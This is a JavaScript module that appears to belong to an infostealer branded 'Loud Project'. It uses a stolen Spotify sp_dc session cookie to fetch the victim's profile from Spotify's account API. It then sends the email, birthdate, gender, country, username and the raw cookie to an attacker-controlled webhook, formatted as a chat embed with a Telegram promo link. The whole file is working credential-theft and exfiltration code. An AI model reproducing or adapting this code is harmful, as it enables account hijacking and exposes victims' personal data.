const axios = require("axios");
const { wbk } = require("../../data/Config");

async function Send(cookie) {
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
    Cookie: `sp_dc=${cookie}`,
  };
  const response = await axios
    .get("https://www.spotify.com/api/account-settings/v1/profile", { headers })
    .then((response) => response.data)
    .catch(() => null);
  if (!response || !response.profile) return;

  const profileData = response.profile;

  const email = profileData.email || "Not available";
  const gender = profileData.gender || "Not available";
  const birthdate = profileData.birthdate || "Not available";
  const country = profileData.country || "Not available";
  const username = profileData.username;

  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 2829617,
          fields: [
            {
              name: "Profile URL",
              value: username ? `[Click here](https://open.spotify.com/user/${username})` : "Username not available",
              inline: true,
            },
            {
              name: "Username",
              value: `\`${username || "Not available"}\``,
              inline: true,
            },
            {
              name: "Email",
              value: `\`${email}\``,
              inline: true,
            },
            {
              name: "Gender",
              value: `\`${gender}\``,
              inline: true,
            },
            {
              name: "Birthdate",
              value: `\`${birthdate}\``,
              inline: true,
            },
            {
              name: "Country",
              value: `\`${country}\``,
              inline: true,
            },
            {
              name: "Cookie",
              value: `\`\`\`${cookie || "Not found"}\`\`\``,
            },
          ],
          color: 13172927,
          author: {
            name: "Spotify Account",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
        },
      ],
    })
    .catch(() => null);
}

module.exports = { Send };
